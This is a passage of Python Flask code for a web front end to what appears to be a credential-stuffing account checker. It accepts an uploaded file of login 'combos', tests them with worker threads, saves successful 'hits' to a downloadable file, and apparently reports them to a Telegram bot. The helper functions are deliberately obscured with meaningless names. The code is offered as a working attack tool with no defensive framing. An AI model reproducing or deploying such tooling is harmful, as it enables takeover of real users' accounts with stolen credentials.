          @app.route('/', methods=['GET', 'POST'])
          def index():
              global active_task, log_messages
              if request.method == 'POST' and active_task['status'] != 'running':
                  f = request.files.get('file')
                  if f:
                      token = request.form.get('token', '').strip()
                      chat_id = request.form.get('chat_id', '').strip()
                      fpath = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(f.filename))
                      f.save(fpath)
                      combos = altiustulegend(fpath)
                      if combos:
                          notifier = umidiemcan(token, chat_id) if token and chat_id else None
                          for fn in ['octohotmail.txt', 'octofree.txt']:
                              if os.path.exists(fn): os.remove(fn)
                          q = Queue()
                          lock = threading.Lock()
                          stats = elhamdulillah()
                          active_task = {'status': 'running', 'stats': stats}
                          log_messages = []
                          def worker_wrapper():
                              threads = []
                              for _ in range(buoc):
                                  t = threading.Thread(target=biriyetmezikincisiolsun, args=(q, notifier, 'octohotmail.txt', lock, stats, log_queue))
                                  t.start()
                                  threads.append(t)
                              for combo in combos: q.put(combo)
                              q.join()
                              for _ in range(buoc): q.put(None)
                              for t in threads: t.join()
                              active_task['status'] = 'finished'
                          threading.Thread(target=worker_wrapper, daemon=True).start()
              while not log_queue.empty():
                  log_messages.append(log_queue.get())
              if len(log_messages) > 100: log_messages = log_messages[-100:]
              st = active_task['stats'] if active_task['stats'] else elhamdulillah()
              return render_template_string(HTML_TEMPLATE, 
                  status=active_task['status'], 
                  stats={'total': st.total, 'hits': st.bababualemdeteek, 'free': st.zencipuruna, 'bad': st.saxsko + st.mahsummmedet}, 
                  logs=log_messages,
                  token=request.form.get('token', '') if request.method == 'POST' else '',
                  chat_id=request.form.get('chat_id', '') if request.method == 'POST' else '',
                  has_hits=os.path.exists('octohotmail.txt'),
                  has_free=os.path.exists('octofree.txt')
              )

          @app.route('/download/<ftype>')
          def download(ftype):
              if ftype == 'hits' and os.path.exists('octohotmail.txt'): return send_file('octohotmail.txt')
              if ftype == 'free' and os.path.exists('octofree.txt'): return send_file('octofree.txt')
